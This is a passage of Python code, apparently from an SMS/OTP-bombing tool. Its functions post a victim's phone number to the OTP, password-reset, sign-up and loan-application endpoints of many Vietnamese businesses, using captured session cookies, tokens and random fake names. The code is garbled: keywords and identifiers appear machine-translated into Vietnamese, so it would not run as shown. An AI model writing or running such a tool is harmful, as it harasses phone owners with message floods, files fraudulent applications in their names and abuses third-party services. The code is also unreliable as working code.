        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-newrelic-id': 'UAQGVlBbDBABVFZSBAkBVVcF',
        'x-requested-with': 'XMLHttpRequest',
    }

    dữ liệu = {
        'điện thoại': sdt,
        'isForgotPassword': '0',
    }

    phản hồi = yêu cầu.post('https://routine.vn/customer/otp/send/', headers=headers, data=data)

    

def send_otp_via_vayvnd(sdt):
    # Headers chung
    tiêu đề = {
        'chấp nhận': 'ứng dụng/json',
        'chấp nhận-ngôn ngữ': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        'dnt': '1',
        'nguồn gốc': 'https://vayvnd.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    # Yêu cầu 1: Tạo người dùng
    json_dữ_liệu_1 = {
        'điện thoại': sdt,
        'utm': [
            {
                'utm_source': 'leadbit',
                'utm_medium': 'cpa',
            },
        ],
        'cpaId': 2,
        'cpaLeadData': {
            'click_id': '66A8D2827EED7B49190B756A',
            'utm_campaign': '44559',
        },
        'sourceSite': 3,
        'regScreenResolution': {
            'chiều rộng': 1920,
            'chiều cao': 1080,
        },
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }

    response_1 = requests.post('https://api.vayvnd.vn/v2/users', headers=headers, json=json_data_1)
    

    # Yêu cầu 2: Yêu cầu reset mật khẩu
    json_dữ_liệu_2 = {
        'đăng nhập': sdt,
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }

    response_2 = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data_2)
    

    # Yêu cầu 3: Yêu cầu reset mật khẩu với antispam
    json_dữ_liệu_3 = {
        'đăng nhập': sdt,
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
        'antispamCheckData': {
            'tên máy chủ': 'vayvnd.vn',
            'recaptchaResponse': '03AFcWeA4a3of5F2rQflfDDN3PoKGexeshUPBijwHLLt_g5MKfy8DOVF7AtAdhNcRg0tk8OxQFZMluITyXgxDF56auNDfD2IqOBzc_0YEQKhjz28R_3Cv7da1x3t73L6y1uGHmh_vbGE4nwjMo6uqQD_4XaGXbrjK3A_MECVrnlxqSzdcFHT_dWY8dZY_XZrVZD8qAaRrxewtpoGroniGyrMXDQBqvpO8cv5NHF6HzebGbHr9pcFdjurawU gyfpvJaIf818dt0Fl71g6BYQ2PDWk81ZI7m6Zz2sIcb_RINTz4VPgnKHO2EYvhnMkxdVHf5H2u5sV1eJuQ-Ess3AgShIQXTbUhorpjz9CDlnKfwcMtQmV47LB_wrJI hkGAyjO2s4Uadi_DJaoqQuk5KzpgWbG0v7hVWoL_FtCxdRioMgrj4zMMGHGUGjsaHUw5f1FJ5ehwPX3BbfFDxgv6G-LAhPOJ6D7QtWP_2K-1Di2Y-DMBiM15k4sr9-j Qq7Hb6i44Df3m0Pe4sF8w4DD6rCrj7qMhQFhz-FxTCMyKg1AZttUoWVYEpkuEudROLWWBoATDsLwdO1ICLaEGeA9V0dRfcFYNm1bpF8AC7Iuya-df_55Uvb3UP1bGD NEvkTPXZIN8gFosYfWFTOt6JbTdWBM11vNT1YzC9rAIsrgCG3FShXF_6dy7_uxJ9v2gykpQ6bHe9EMJEK9xsQn50kOTTXOLJPXxOdplk4LdQfVzgkWsMnGPhbtK5n5E 8hFHz--vQy61eAHHJ0gxs1ybOgFpEn53BDkKWXyOrOvvEDDdffBhwwDcl1C5zKRN1-_gYLfgEMI8Hxmq7AWfF_kQ6eOPq2DM5JY01v4nuLj06s-RQwyKO_R1q6IS5LvWek425nDxjt7ihJLbfUotuMCWDvnBm_pSm05pTm8WL6twt9vLd_K4BB-ME-5DFAHbmopkZj6rGQhXGLMWEU-rvgOG-qgZ1_VE_0-j254Sw19qZcz_bdUGXxeblMoWT hlaMf8OQT5s9O1enSYTPWCtMhWsgDT5Crb2xMGHWkO5nbC0X2KOT-uNWNIMldpA3DSs4jTSecEhZW2NPAjygBqSs4ZsllUOl8gaq5hv352ysq6T6nFs_fpoBhCNnhNQR0_G3Qw80ZS7cfC1YlCoDAItOd9AgD0oWsvjV9gUkSz9WgmkCL0vxnndR2ixnyolsRZqMxT7Q8RirZZU-plNUDW0Tj7cfkGPib4MFZ5P3J08LPP1uSeuctw4HXSRhe ltiEvu5IFZ4UExasH5yMbyTBYSrAMw9IlO3s8KnNu9UQMX9pOzjo8wXdS4QiSoOo0PjQ4RV881eL6ojJv-py9IVmezFvPohm9JmcFRgzuXWnv5WpXyclW1AhTHjGc1 9emxXc92q2fnqouvYr3-cgQtFyHJInovng8kmUBa-d8mSuT-36a6LaiqKLi-cw0sCVXHmOdXnULf7DMh48AD6VLDw49jwYeczc3K3WJDz0cWJDPZwen8GmC-uuhIGi1 hER1q6Mfq01GCKs2lLwbmCysD9xURNFGXu9NUjHoE0J6QHlxdq95scnOone1SIivS0Y9OlK192g_C_c26g-7-aMft1_QQ4pb7r7asb-yHglSBadL3DMHk4ig2qMf5bMX2Z01GDbt6pAC0UIjtsuSI0zwNQiyWV6rePlXp9_5n0VZD2svaUel7KnIv6SFyrwo2kk1Y1iaahtbk6rIWYW-oYcU4Xo67PzkSkd5o2BdVbMNoqyoE3_64SdGbCJhp MixqxBJTKVqeKn0ohM1H7m8RDs-ECaAfEHO8j96z1E1P2m0HVO5zJNB-8WnIEW3gJ1X5OjymNfqrMNr94626PA04O9_-NPTwuKFmIJZE2aEtItXRBvXR1GUZBdpH32PrECRp8Mo-sOz1W7UBwkvAfaOvYDn3zJ-k54emVQ4bf-vEpvDLYKtffIHmy1dcSMP8vhJJgykim-fxJ8cEYYKpRxWrE9CiobKH78pDTEIWIj8GzCkxrqbe4ycj5kA',
        },
    }

    response_3 = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data_3)
    






def send_otp_via_tima(sdt):


    bánh quy = {
        'ASP.NET_SessionId': 'm1ooydpmdnksdwkm4lkadk4p',
        'UrlSourceTima_V3': '{"utm_campaign":null,"utm_medium":null,"utm_source":"www.bing.com","utm_content":null,"utm_term":null,"Referer":"www.bing.com"}',
        'tkld': 'b460087b-2c70-9d44-da8d-68d0d4c00f3a',
        'tbllender': 'tbllender',
    }

    tiêu đề = {
        'chấp nhận': 'văn bản/html,ứng dụng/xhtml+xml,ứng dụng/xml;q=0.9,hình ảnh/avif,hình ảnh/webp,hình ảnh/apng,*/*;q=0.8,ứng dụng/trao đổi đã ký;v=b3;q=0.7',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểm soát bộ nhớ đệm': 'tuổi tối đa = 0',
        'kiểu-nội-dung': 'ứng-dụng/x-www-form-urlencoded',
        # 'cookie': 'ASP.NET_SessionId=m1ooydpmdnksdwkm4lkadk4p; UrlSourceTima_V3={"utm_campaign":null,"utm_medium":null,"utm_source":"www.bing.com","utm_content":null,"utm_term":null,"Referer":"www.bing.com"}; tkld=b460087b-2c70-9d44-da8d-68d0d4c00f3a; tbllender=tbllender',
        'dnt': '1',
        'nguồn gốc': 'https://tima.vn',
        'ưu tiên': 'u=0, i',
        'người giới thiệu': 'https://tima.vn/vay-tien-online/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'tài liệu',
        'sec-fetch-mode': 'điều hướng',
        'sec-fetch-site': 'cùng nguồn gốc',
        'sec-fetch-user': '?1',
        'yêu cầu nâng cấp không an toàn': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu = {
        'application_full_name': tạo_tên_ngẫu_nhiên(),
        'application_mobile_phone': sdt,
        'CityId': '1',
        'DistrictId': '16',
        'quy tắc': 'đúng',
        'Kiểu thời gian': '1',
        'application_amount': '0',
        'application_term': '0',
        'UsertAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'IsApply': '1',
        'Tên tỉnh': 'Thành phố Hà Nội',
        'Tên Quận': 'Huyện Sóc Sơn',
        'product_id': '2',
    }

    phản hồi = yêu cầu.post('https://tima.vn/Người vay/Đăng ký khoản vay nhanh', cookie=cookie, tiêu đề=tiêu đề, dữ liệu=dữ liệu)

    






def send_otp_via_moneygo(sdt):

    bánh quy = {
        'XSRF-TOKEN': 'eyJpdiI6IlJZYnY1ZHhEVmdBRXpIbXcza3A0N2c9PSIsInZhbHVlIjoiUEtCV09IdmFlVkZWQ1R3c2ZIT01seSthcVdaMFhDb2lVTkEybjVJZksrQnR4dmliSEFnWkp0dklONE5LMVZBOUQxNXpaVDNWbmdadExaQmt3V y9ZVzdYL0JWR2lSSU91RG40ZDVybERZaWJEcnhBNWhBVHYzVHBQbjdVR0x2S0giLCJtYWMiOiJhOTBjMzExYzg3YjM1MjY2ZGIwODk0ZThlNWFkYzEwNGMyYzc2ZmFmMmRlYzNkOTExNDM3M2E5ZjFmYWEzNjA1In0%3D',
        'laravel_session': 'eyJpdiI6IlpHaDc2cGgyc0g4akhrdHFkT0tic1E9PSIsInZhbHVlIjoiSjYxQWZ4VlA0UmFwVDVGdkE2TzQ2OU1PSDhJQlR3MVBlbzdKV3g3a3czcStucGpIbTJIRnVpR0l3ZVR3clJsWUxjSlFMRUFuK3NhQ2VKVC9hc 2Q5QlJYZEhpRVdNa0xlV21XcFgrelpoQTBhSUdlNngvR0NSRVdzUEFJcXhPNXUiLCJtYWMiOiIxYmM4NDBk N2VhMTVhZTJhOGU5MzFlOTUwNDc4NzFhOTBhNzc1NTliZmE2MWM3MmUwNjZjNDAyMDg5OWZmODE4In0%3D',
    }

    tiêu đề = {
        'chấp nhận': 'văn bản/html,ứng dụng/xhtml+xml,ứng dụng/xml;q=0.9,hình ảnh/avif,hình ảnh/webp,hình ảnh/apng,*/*;q=0.8,ứng dụng/trao đổi đã ký;v=b3;q=0.7',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểm soát bộ nhớ đệm': 'tuổi tối đa = 0',
        'kiểu-nội-dung': 'ứng-dụng/x-www-form-urlencoded',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IlJZYnY1ZHhEVmdBRXpIbXcza3A0N2c9PSIsInZhbHVlIjoiUEtCV09IdmFlVkZWQ1R3c2ZIT01seSthcVdaMFhDb2lVTkEybjVJZksrQnR4dmliSEFnWkp0dklONE5LMVZBOUQxNXpaVDNWbmdadEx aQmt3Vy9ZVzdYL0JWR2lSSU91RG40ZDVybERZaWJEcnhBNWhBVHYzVHBQbjdVR0x2S0giLCJtYWMiOiJhOTBjMzExYzg3YjM1MjY2ZGIwODk0ZThlNWFkYzEwNGMyYzc2ZmFmMmRlYzNkOTExNDM3M2E5ZjFmYWEzNjA1In0%3D; laravel_session=eyJpdiI6IlpHaDc2cGgyc0g4akhrdHFkT0tic1E9PSIsInZhbHVlIjoiSjYxQWZ4VlA0UmFwVDVGdkE2TzQ2OU1PSDhJQlR3MVBlbzdKV3g3a3czcStucGpIbTJIRnVpR0l3ZVR3clJsWUxjSlFMRUFuK3NhQ2 VVC9hc2Q5QlJYZEhpRVdNa0xlV21XcFgrelpoQTBhSUdlNngvR0NSRVdzUEFJcXhPNXUiLCJtYWMiOiIxYmM4N DBkN2VhMTVhZTJhOGU5MzFlOTUwNDc4NzFhOTBhNzc1NTliZmE2MWM3MmUwNjZjNDAyMDg5OWZmODE4In0%3D',
        'dnt': '1',
        'nguồn gốc': 'https://moneygo.vn',
        'ưu tiên': 'u=0, i',
        'người giới thiệu': 'https://moneygo.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'tài liệu',
        'sec-fetch-mode': 'điều hướng',
        'sec-fetch-site': 'cùng nguồn gốc',
        'sec-fetch-user': '?1',
        'yêu cầu nâng cấp không an toàn': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu = {
        '_token': 'X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV',
        'tổng cộng': '56688000',
        'điện thoại': sdt,
        'đồng ý': '1',
    }

    phản hồi = yêu cầu.post('https://moneygo.vn/dang-ki-vay-nhanh', cookie=cookies, headers=headers, data=data)

    


def send_otp_via_pico(sdt):
    # Yêu cầu đầu tiên
    tiêu đề_1 = {
        'chấp nhận': '*/*',
        'chấp nhận-ngôn ngữ': 'vi',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://pico.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://pico.vn/',
        'mã vùng': 'MB',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_dữ_liệu_1 = {
        'tên': generate_random_name(),
        'điện thoại': sdt,
        'mã tỉnh': '92',
        'mã quận': '925',
        'Mã phường': '31261',
        'địa chỉ': '123',
    }

    response_1 = requests.post('https://auth.pico.vn/user/api/auth/register', headers=headers_1, json=json_data_1)
    
    # Xử lý phản hồi của yêu cầu đầu tiên nếu cần thiết
    

    # Yêu cầu thứ hai
    tiêu đề_2 = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'chấp nhận-ngôn ngữ': 'vi',
        'truy cập': '206f5b6838b4e357e98bf68dbb8cdea5',
        'kênh': 'b2c',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://pico.vn',
        'bên': 'ecom',
        'nền tảng': 'Máy tính để bàn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://pico.vn/',
        'mã vùng': 'MB',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'uuid': 'cc31d0b5815a483b92f547ab8438da53',
    }

    json_dữ_liệu_2 = {
        'điện thoại': sdt,
    }

    response_2 = requests.post('https://auth.pico.vn/user/api/auth/login/request-otp', headers=headers_2, json=json_data_2)
    
    # Xử lý phản hồi của yêu cầu thứ hai nếu cần thiết
    













def send_otp_via_PNJ(sdt):


    bánh quy = {
        'CDPI_VISITOR_ID': '78166678-ea1e-47ae-9e12-145c5a5fafc4',
        'CDPI_RETURN': 'Mới',
        'CDPI_SESSION_ID': 'f3a5c6c7-2ef6-4d19-a792-5e3c0410677f',
        'XSRF-TOKEN': 'eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh 1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVizYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwM TM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWewYmU3ZWEyIiwidGFnIjoiIn0%3D',
        'mypnj_session': 'eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHB RcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1M jEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
    }

    tiêu đề = {
        'chấp nhận': 'văn bản/html,ứng dụng/xhtml+xml,ứng dụng/xml;q=0.9,hình ảnh/avif,hình ảnh/webp,hình ảnh/apng,*/*;q=0.8,ứng dụng/trao đổi đã ký;v=b3;q=0.7',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểm soát bộ nhớ đệm': 'tuổi tối đa = 0',
        'kiểu-nội-dung': 'ứng-dụng/x-www-form-urlencoded',
        # 'cookie': 'CDPI_VISITOR_ID=78166678-ea1e-47ae-9e12-145c5a5fafc4; CDPI_RETURN=Mới; CDPI_SESSION_ID=f3a5c6c7-2ef6-4d19-a792-5e3c0410677f; XSRF-TOKEN=eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaE hXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVizYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3OD MwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxd DQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWharDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1Yj U1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
        'dnt': '1',
        'nguồn gốc': 'https://www.pnj.com.vn',
        'ưu tiên': 'u=0, i',
        'người giới thiệu': 'https://www.pnj.com.vn/customer/login',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'tài liệu',
        'sec-fetch-mode': 'điều hướng',
        'sec-fetch-site': 'cùng nguồn gốc',
        'sec-fetch-user': '?1',
        'yêu cầu nâng cấp không an toàn': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu = {
        '_phương pháp': 'POST',
        '_token': '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU',
        'loại': 'zns',
        'điện thoại': sdt,
    }

    phản hồi = yêu cầu.post('https://www.pnj.com.vn/customer/otp/request', cookie=cookies, headers=headers, data=data)
    


def send_otp_via_TINIWORLD(sdt):
    bánh quy = {
        'connect.sid': 's%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
    }

    tiêu đề = {
        'chấp nhận': 'văn bản/html,ứng dụng/xhtml+xml,ứng dụng/xml;q=0.9,hình ảnh/avif,hình ảnh/webp,hình ảnh/apng,*/*;q=0.8,ứng dụng/trao đổi đã ký;v=b3;q=0.7',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểm soát bộ nhớ đệm': 'tuổi tối đa = 0',
        'kiểu-nội-dung': 'ứng-dụng/x-www-form-urlencoded',
        # 'cookie': 'connect.sid=s%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
        'dnt': '1',
        'nguồn gốc': 'https://prod-tini-id.nkidworks.com',
        'ưu tiên': 'u=0, i',
        'người giới thiệu': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'tài liệu',
        'sec-fetch-mode': 'điều hướng',
        'sec-fetch-site': 'cùng nguồn gốc',
        'sec-fetch-user': '?1',
        'yêu cầu nâng cấp không an toàn': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu = {
        '_csrf': '',
        'clientId': '609168b9f8d5275ea1e262d6',
        'redirectUrl': 'https://tiniworld.com',
        'điện thoại': sdt,
    }

    phản hồi = yêu cầu.post('https://prod-tini-id.nkidworks.com/auth/tinizen', cookie=cookie, headers=headers, data=data)
    








def gửi_otp_qua_BACHHOAXANH(sdt):

    tiêu đề = {
        'Chấp nhận': 'application/json, text/plain, */*',
        'Ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'Kiểm soát truy cập-Cho phép-Nguồn gốc': '*',
        'Kết nối': 'duy trì kết nối',
        'Loại nội dung': 'ứng dụng/json',
        'DNT': '1',
        'Nguồn gốc': 'https://www.bachhoaxanh.com',
        'Người giới thiệu': 'https://www.bachhoaxanh.com/dang-nhap',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'ủy quyền': 'Người mang 48AEFAE5FF6C90A31EBC7BB892756688',
        'deviceid': '1c4323a6-32d4-4ce5-9081-b5a4655ba7e6',
        'nền tảng': 'webnew',
        'url-người giới thiệu': 'https://www.bachhoaxanh.com/dang-nhap',
        'reversehost': 'http://bhxapi.live',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'xapikey': 'bhx-api-core-2022',
    }

    dữ liệu json = {
        'deviceId': '1c4323a6-32d4-4ce5-9081-b5a4655ba7e6',
        'tên người dùng': sdt,
        'isOnlySms': 1,
        'ip': '',
    }

    phản hồi = yêu cầu.post('https://apibhx.tgdd.vn/User/LoginWithPassword', headers=headers, json=json_data)
    


def send_otp_via_shbfinance(sdt):
    tiêu đề = {
        'Chấp nhận': 'application/json',
        'Ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'Ủy quyền': 'Người mang',
        'Kết nối': 'duy trì kết nối',
        'Loại nội dung': 'ứng dụng/json',
        'DNT': '1',
        'Nguồn gốc': 'https://www.shbfinance.com.vn',
        'Người giới thiệu': 'https://www.shbfinance.com.vn/',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng một trang web',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu json = {
        'customerName': generate_random_name(),
        'mobileNumber': sdt,
        'Mã chiến dịch': '',
        'documentIds': 'Tiền mặt',
        'năm': 1996,
        'provinceName': 'An Giang',
        'tên huyện': 'Châu Đốc',
        'quận': Không có,
        'document': 'Vay tiền mặt',
        'cho vayAmt': 40000000,
        'loanAmt': 40000000,
        'cho vayPeriod': 12,
        'ngày sinh': '01-01-1996',
        'partnerName': 'Trang web',
        'utmSource': 'WEB',
        'utmMedium': 'hình thức',
        'utmCampaign': 'vay-tien-mat',
    }

    phản hồi = yêu cầu.post('https://customer-app-nred.shbfinance.com.vn/api/web/SubmitLoan', headers=headers, json=json_data)
    

def send_otp_via_mafccomvn(sdt):
    bánh quy = {
        'pll_language': 'vi',
        'BIGipServerPool_www.mafc.com.vn': '654334730.20480.0000',
        'mafcavraaaaaaaaaaaaaaaa_session_': 'BOHBOMAPPPCOMKFPMBDFGDKHMLOJBNAGGGJLKOHELAEOACOEOOPLCKEMKDFMAPDGIOODBMJAMIMBGNFKCCDAFABCFAAIAMONKAHEOOIKOMIPOGDMKFHNPLJKOOHONLEB',
        'MAFC01f6952f': '018fd3cf680ed5f9ed9f2546edbe4214c6c1d1c24f980b9654ff43d962a4d45ed15fb96ee094bb83a9588a303cba75f8db9042279ac6bca62d751 af525b2ef57f146709597d08b14f2fc4d49b046c36fa46b82805b1c7712182214182103581f9f2e641831f6688f99544fe20f2b11df2fc5c814ed',
        'MAFC00000000233': '',
        'MAFC_101_DID': '0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c8063800 f8d5e8ee925ae9ecf081258c38f27590e9879625c7624c6033304425b50ad0443a41fabf9652f15fc34d093f802fe31082aa893b4c121ec9',
        'MAFCed66693a184': '0850209877ab2000035bb49d85d36c1714180eb222a6a5c6b20c2e3328516f0da52a6fabdd5acf9e081c5884c8113000 a63479a1b533672c96c6790276b673af3e57c251be970cc54abb2a88d001192bb815cb83ac72e7084a193babac4e2f33',
    }

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/javascript, */*; q=0.01',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểu-nội-dung': 'ứng-dụng/json',
        # 'cookie': 'pll_language=vi; BIGipServerPool_www.mafc.com.vn=654334730.20480.0000; mafcavraaaaaaaaaaaaaaaa_session_=BOHBOMAPPPCOMKFPMBDFGDKHMLOJBNAGGGJLKOHELAEOACOEOOPLCKEMKDFMAPDGIOODBMJAMIMBGNFKCCDAFABCFAAIAMONKAHEOOIKOMIPOGDMKFHNPLJKOOHONLEB; MAFC01f6952f=018fd3cf680ed5f9ed9f2546edbe4214c6c1d1c24f980b9654ff43d962a4d45ed15fb96ee094bb83a9588a303cba75f8db9042279ac6bca62d751af525b2ef57f146709597d08b14f2fc4d49b046c36fa46b82805b1c7712182214182103581f9f2e641831f6688f99544fe20f2b11df2fc5c814ed; MAFC00000000233=; MAFC_101_DID=0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c8 063800f8d5e8ee925ae9ecf081258c38f27590e9879625c7624c6033304425b50ad0443a41fabf9652f15fc34d093f802fe31082aa893b4c121ec9; MAFCed66693a184=0850209877ab2000035bb49d85d36c1714180eb222a6a5c6b20c2e3328516f0da52a6fabdd5acf9e081c5884c 8113000a63479a1b533672c96c6790276b673af3e57c251be970cc54abb2a88d001192bb815cb83ac72e7084a193babac4e2f33',
        'dnt': '1',
        'nguồn gốc': 'https://mafc.com.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://mafc.com.vn/vay-tien-nhanh',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
